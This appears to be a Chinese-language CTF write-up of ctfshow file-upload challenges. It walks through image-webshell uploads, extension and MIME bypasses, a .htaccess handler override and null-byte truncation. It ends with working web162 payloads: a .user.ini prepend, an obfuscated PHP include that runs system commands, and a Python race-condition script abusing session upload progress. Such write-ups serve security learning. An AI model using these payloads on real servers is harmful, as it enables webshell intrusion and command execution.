---
uuid: c4a9a981-05ea-64ec-fa7c-7b71320fd3ae
title: ctfshow文件上传
date: 2022-02-08 18:43:54
tags:
      - bugctf
      - CTF
      - Web
categories: 
       - [Web]
       - [CTF]
---

文件上传题型
<!--more-->

# 文件上传1--图片马上传

![image-20220208184616805](https://img-blog.csdnimg.cn/img_convert/44d4509d24bfbb31e78d0206fef19b49.png)

![image-20220208184653016](https://img-blog.csdnimg.cn/img_convert/404fc0b3d659d1cad6dfa26d56c491cf.png)

直接上传一句话发现不行，只允许上传图片，那就制作图片马上传吧！

![image-20220208184858927](https://img-blog.csdnimg.cn/img_convert/b093fdb2f10746ae3910281dc3a7c558.png)

但是发现还是不能正常上传，这就该考虑是不是过滤了，尝试将php改为php3.4.5或者phtml试试

![image-20220208185100735](https://img-blog.csdnimg.cn/img_convert/c95eeeb51c74f607b5819a622fad9b35.png)

放一个图吧，这发现还是不行。这个时候就应该考虑应该是Content-Type: multipart/form-data被拦截，这个是有解决办法的，strpos()区分大小写，使用大写绕过即可

![image-20220208185355163](https://img-blog.csdnimg.cn/img_convert/91d56f1cd515922500c99aba5bf0512c.png)

这个时候发现依然不行，那应该对上传文件的格式页有黑名单，那把php改成php4试试(php3和php5都试了，发现不行)

![image-20220208185459783](https://img-blog.csdnimg.cn/img_convert/c6db479da059d6f8d7dbb109f417ec6e.png)

这个时候发现终于可以上传了。

然后上蚁剑shell，即可顺利得到flag!

# 文件上传2--不需要验证

这类题型比较简单！

![image-20220213092711909](https://img-blog.csdnimg.cn/img_convert/b46bbc9e601b96776fb0a2f775cd8d71.png)

直接上传一句话然后蚁剑连接就可！![image-20220213092746633](https://img-blog.csdnimg.cn/img_convert/8f8d72b9a0d9e8ce97a906b66824638d.png)

![image-20220213092907477](https://img-blog.csdnimg.cn/img_convert/aa35cf8ea67374cddd7bc23d7883fa0e.png)

# 文件上传3--初步的前端验证

![image-20220213094222453](https://img-blog.csdnimg.cn/img_convert/146ddb8cc158e6e10d4cb90fd7bf25df.png)

这个时候再上传一句话木马就不可以了，需要上传图片马来进行绕过前端验证！bp抓包改后缀![image-20220213094425933](https://img-blog.csdnimg.cn/img_convert/18f8c36b78ebbbbf0c9b24b206fc98a0.png)

![image-20220213095256115](https://img-blog.csdnimg.cn/img_convert/18bd58921a30a5a96472da395a5b3e73.png)

成功上传，然后蚁剑连接，得到flag！

# 文件上传4--文件头检查绕过

![image-20220213095639275](https://img-blog.csdnimg.cn/img_convert/863985a9bca47467ec94e1bf971a3a09.png)

首先先bp抓包上传图片马试试![image-20220213095944411](https://img-blog.csdnimg.cn/img_convert/16e2c42eb0b0d7e028fc53c145488939.png)

发现可以正常上传，那用蚁剑连接看一下![image-20220213100041277](https://img-blog.csdnimg.cn/img_convert/211240fb4ac22fb7abcf30c5a50e6055.png)

发现可以正常连接！找到flag提交即可！

这里有必要解释一下，因为这个题考察的是文件头检查绕过，但是为啥我做的这么直接呢，这个题有很多种解法，我这个是直接上传图片马，所以文件头Content-type就是image/png，不需要做任何更改就可以上传。

还有一种解法就是得需要修改文件头，那是因为上传的是php文件的一句话，这个时候Content-type就不是image/png了，如果不修改文件头就没有办法正常上传，所以这个时候就会修改为image.png,依次绕过，成功上传！

# 文件上传5--MIME绕过

![image-20220213100857098](https://img-blog.csdnimg.cn/img_convert/2678614f4f23bde83edb1d27db2a1426.png)

还是先上传个图片马，bp抓包看看！

![image-20220213100848241](https://img-blog.csdnimg.cn/img_convert/405da36697ede869554402dddc094fe3.png)

这个时候发现修改一下后缀还是可以正常上传的，莫非直接蚁剑又可以直接解出来？？？？试试！![image-20220213101044425](https://img-blog.csdnimg.cn/img_convert/4291c24bfbb53ce346ffaa138b712e8a.png)

emmm，这让我咋说，又是正常直接连接，害！看来不能光做题了，了解一下MIME绕过吧！

MIME(multipurpose Internet mail extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。![img](https://img-blog.csdnimg.cn/img_convert/6d29e33d4d6770f4139852ce12c4f84a.png)

我看到网上的wp都是需要修改一下文件类型！但是我这又是不用修改就默认是image/png，应该也是因为我上传图片马的缘故吧！我只能说图片马yyds！

# 文件上传6--.htaccess

htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。



![image-20220213101632834](https://img-blog.csdnimg.cn/img_convert/9873b4028ea4a24f77317c7cf1f813a1.png)

![image-20220213101839062](https://img-blog.csdnimg.cn/img_convert/7332620935aaae5e29b2b21600d65df9.png)

终于不像前几题那样如此敷衍了，这次没有成功上传了！通过代码发现有黑名单，把好多后缀都拉黑了！![image-20220213102005201](https://img-blog.csdnimg.cn/img_convert/ce89134d3fb85a3274929d63198dda80.png)

了解了一下htaccess文件的特点，这个题可以重写文件的解析规则来绕过，具体步骤就是先上传.htaccess文件，把之前的文件替换掉，文件内容如下：

```
SetHandler application/x-httpd-php
```

文件内容是这个，意思就是将上传的文件当作php文件进行解析！

上传好这个文件之后再上传图片马然后直接蚁剑连接即可！!

> （在这里我走过弯路，我以为再上传图片马的时候还是需要像之前那样bp抓包改后缀，结果蚁剑一直都连不上，现在再回想一下，发现.htaccess文件已经起到了这个作用，不需要再换后缀了）

![image-20220215205204866](https://img-blog.csdnimg.cn/img_convert/5b5bae3ce24233dd5461ebed4beaa7a9.png)

# 文件上传7-- 00截断

![image-20220215113637612](https://img-blog.csdnimg.cn/img_convert/69a9335a405777ee81cbb7e29239623b.png)

![image-20220215113733831](https://img-blog.csdnimg.cn/img_convert/9b8ff85930d93e9739a9ea0beb78f49d.png)

正常上传图片马后发现并不能通过，这个时候发现有白名单绕过

```
   $whitelist = array("jpg", "png", "gif");
```

鉴于这个题是考察00截断，搜查资料发现00截断一般都是在上传路径截断，可以看到请求连接处包含road参数![image-20220215114956967](https://img-blog.csdnimg.cn/img_convert/f9024a85675fc89523133da555297538.png)

![image-20220215222344049](https://img-blog.csdnimg.cn/img_convert/d052a507d2f335ee4d29dd099b77ff9d.png)

把这个参数内容修改为`/var/www/html/upload/muma.php%00`，然后蚁剑连接得到flag！![image-20220215222736575](https://img-blog.csdnimg.cn/img_convert/6620af75de7e94451ce788a32b59bc6d.png)

# 文件上传8--双写后缀

![image-20220215212331181](https://img-blog.csdnimg.cn/img_convert/002dfcbef1ad8e073593e57cc237aff5.png)

```
双写后缀绕过用于只将文件后缀名，例如"php"字符串过滤的场合；
例如:上传时将Burpsuite截获的数据包中文件名【evil.php】改为【evil.pphphp】，那么过滤了第一个"php"字符串"后，开头的'p'和结尾的'hp'就组合又形成了【php】。
```

![img](https://img-blog.csdnimg.cn/img_convert/59a8e50bc958f8f4ee82b051f177550d.png)

上传之后这样修改之后发送数据包，然后蚁剑连接，得到flag！![image-20220215212536157](https://img-blog.csdnimg.cn/img_convert/a5e889c11e631bd18a51b61655c78c4b.png)

# 文件上传9--前端验证

![image-20220206165932472](https://img-blog.csdnimg.cn/img_convert/9ce8fe3bff1e9d904eecdaa77ff38487.png)

这个题说了上传图片，所以php的一句木马应该上传不了，合成一下图片木马上传一下！

但是上传成功之后发现蚁剑还是没有办法连接，这个时候首先考虑到的是前端验证导致的，bp抓包修改一下后缀，把png修改成php,然后蚁剑连接成功，得到flag，放图

![image-20220206170213732](https://img-blog.csdnimg.cn/img_convert/5d31793bdc53189f16fae0c1ea612391.png)

![image-20220206170225325](https://img-blog.csdnimg.cn/img_convert/9a442b12e1bde01036691be022cba313.png)

这道题只是简单的前端验证，解题步骤也就是这样！

# 文件上传10--后端校验

这个题没啥说的，思路和151一样，就不说了





----------------------------------------------------------------------------------------分割线--------------------------------------------------------------------------------------

上面是之前刷题的记录，这里从ctfshow的web162开始刷

# web162

这道题目也是上传.user.ini之后再上传图片🐎

这道题无非就是把点给过滤了，只需要上传的🐎不带点即可

.user.ini

```
GIF89a

auto_prepend_file=png
```

png

```
GIF89a
<?=require~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%d8%8b%9e%9c%df%d1%d1%d0%99%d5%d8%d6%c4%c0%c1?>
```

采用取反

```
<?php
$a = "data://text/plain,<?php system('tac ../f*');?>";
echo "~(";
for ($i = 0; $i < strlen($a); $i++) {
    echo "%".bin2hex(~$a[$i]);
}
echo ")";

```

脚本实现如下

```
import requests
import threading

rs = requests.session()
sess = 'hahaha'
url = "https://7129a574-6701-4301-b099-512ab7f25342.challenge.ctf.show/"
data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'
}
file = {
    'file': sess
}
cookie = {
    'PHPSESSID': sess
}


def write():
    while True:
        rs.post(url, data=data, files=file, cookies=cookie)


def read():
    while True:
        r = rs.get(url + "/upload/index.php")
        if 'flag' in r.text or 'ctfshow' in r.text:
            print(r.text)
            exit()


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()


```

